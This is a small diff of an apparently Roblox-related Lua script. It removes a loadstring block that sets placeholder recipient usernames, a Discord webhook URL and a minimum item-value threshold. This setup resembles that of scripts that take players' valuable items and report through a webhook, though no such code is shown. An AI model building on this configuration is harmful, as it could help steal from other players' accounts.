@@ -1,9 +1,3 @@
-loadstring([[
-getgenv().Username = "your_first_username"
-getgenv().Username2 = "your_second_username"
-getgenv().Webhook = "https://discord.com/api/webhooks/your_webhook_id"
-getgenv().MinimumRAP = 1500
-
 local Username = getgenv().Username
 local Username2 = getgenv().Username2
 local Webhook = getgenv().Webhook
